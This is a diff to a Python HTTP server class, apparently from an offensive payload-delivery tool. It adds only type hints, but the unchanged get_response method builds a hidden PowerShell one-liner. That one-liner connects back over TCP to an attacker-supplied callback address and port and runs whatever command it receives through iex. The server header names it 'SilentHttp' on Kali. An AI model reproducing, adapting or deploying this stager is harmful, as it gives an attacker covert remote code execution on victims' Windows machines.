@@ -3,7 +3,7 @@ import time
 import threading
 
 class HTTPServer:
-        def __init__(self, callback_address: str, listen_port: str, callback_port: str):
+        def __init__(self, callback_address: str, listen_port: str, callback_port: str) -> None:
                 self.callback_address   = callback_address
                 self.listen_port        = listen_port
                 self.callback_port      = callback_port
@@ -30,7 +30,7 @@ class HTTPServer:
 
                 return True
 
-        def serve(self):
+        def serve(self) -> None:
                 while True:
                         try:
                                 self.client, address = self.accept_client()
@@ -54,7 +54,7 @@ class HTTPServer:
 
                 return True
 
-        def accept_client(self) -> tuple:
+        def accept_client(self) -> tuple[socket.socket, tuple[str, int]]:
                 try:
                         return self.listener.accept()
                 except:
@@ -71,7 +71,7 @@ class HTTPServer:
 
                 return data == correct_request
 
-        def get_response(self):
+        def get_response(self) -> str:
                 content                 = """powershell -wi h -c "start powershell -wi h -arg {`$t=[net.sockets.tcpclient]::new('""" + self.callback_address + "'," + str(self.callback_port) + ");[io.streamreader]::new(`$t.getstream()).readline()|iex}\""""
                 http_response           = "HTTP/1.0 200 OK"
                 http_server             = "Server: SilentHttp/1.0.0 (Kali)"
